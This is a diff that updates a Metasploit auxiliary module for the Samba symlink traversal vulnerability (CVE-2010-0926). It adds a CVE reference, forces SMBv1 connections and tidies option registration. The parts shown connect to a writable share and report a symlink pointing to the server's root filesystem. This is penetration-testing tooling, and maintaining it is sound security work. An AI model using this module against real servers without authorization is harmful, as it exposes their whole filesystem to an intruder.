@@ -1,11 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-
-require 'msf/core'
-
 
 class MetasploitModule < Msf::Auxiliary
 
@@ -34,6 +30,7 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'References'  =>
         [
+          ['CVE', '2010-0926'],
           ['OSVDB', '62145'],
           ['URL', 'http://www.samba.org/samba/news/symlink_attack.html']
         ],
@@ -43,14 +40,15 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server']),
       OptString.new('SMBTARGET', [true, 'The name of the directory that should point to the root filesystem', 'rootfs'])
-    ], self.class)
+    ])
 
+    deregister_options('SMB::ProtocolVersion')
   end
 
 
   def run
     print_status("Connecting to the server...")
-    connect()
+    connect(versions: [1])
     smb_login()
 
     print_status("Trying to mount writeable share '#{datastore['SMBSHARE']}'...")
@@ -63,5 +61,4 @@ class MetasploitModule < Msf::Auxiliary
     print_status("\t\\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
     print_line("")
   end
-
 end
